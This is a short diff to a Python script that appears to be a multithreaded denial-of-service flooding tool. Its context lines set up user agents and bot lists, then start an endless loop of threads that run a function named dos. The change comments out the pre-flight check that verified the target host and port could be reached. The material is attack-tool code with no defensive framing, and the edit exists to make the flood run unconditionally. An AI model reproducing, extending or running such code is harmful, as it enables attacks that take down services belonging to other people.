@@ -134,13 +134,13 @@ if __name__ == '__main__':
 	user_agent()
 	my_bots()
 	time.sleep(5)
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host,int(port)))
-		s.settimeout(1)
-	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
-		usage()
+	#try:
+	#	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#	s.connect((host,int(port)))
+	#	s.settimeout(1)
+	#except socket.error as e:
+	#	print("\033[91mcheck server ip and port\033[0m")
+	#	usage()
 	while True:
 		for i in range(int(thr)):
 			t = threading.Thread(target=dos)
